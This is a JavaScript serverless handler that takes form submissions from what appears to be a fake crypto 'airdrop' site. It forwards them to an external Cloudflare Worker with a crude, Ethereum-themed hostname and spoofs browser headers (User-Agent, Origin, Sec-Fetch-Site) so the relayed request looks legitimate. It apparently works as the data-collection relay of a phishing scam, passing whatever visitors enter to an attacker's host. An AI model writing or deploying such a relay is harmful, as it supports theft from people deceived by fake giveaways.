// api/submit.js
const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";

const ALLOWED_ORIGINS = [
  "https://big-airdrop.netlify.app",
  "http://localhost:3000",
  "http://localhost:5173",
  "http://127.0.0.1:5500",
  "http://127.0.0.1:8080"
];

function originFromReferer(referer = "") {
  try {
    if (!referer) return "";
    const u = new URL(referer);
    return `${u.protocol}//${u.host}`;
  } catch { return ""; }
}

export default async function handler(req, res) {
  const reqOrigin = req.headers.origin || "";
  const referer = req.headers.referer || "";
  const origin = reqOrigin || originFromReferer(referer);

  // --- OPTIONS (preflight) ---
  if (req.method === "OPTIONS") {
    if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: "Forbidden origin (preflight)", got: origin || null });
    }
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    res.setHeader("Vary", "Origin");
    return res.status(200).send("ok");
  }

  // --- رفض غير POST ---
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  // --- فحص الأصل ---
  if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
    // نرجّع CORS حتى يرى المتصفح الرد
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Vary", "Origin");
    return res.status(403).json({ error: "Forbidden origin", got: origin || null });
  }

  try {
    // تمرير الطلب للـWorker مع Origin نفسه + رؤوس معقولة
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json,text/html;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Origin": origin,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
      },
      body: JSON.stringify(req.body)
    });

    const raw = await response.text();
    let payload;
    try { payload = JSON.parse(raw); } catch { payload = { raw }; }

    // CORS في الرد
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");

    return res.status(response.status).json(payload);
  } catch (err) {
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Vary", "Origin");
    return res.status(500).json({ error: "Failed forwarding request", details: err?.message || "unknown" });
  }
}
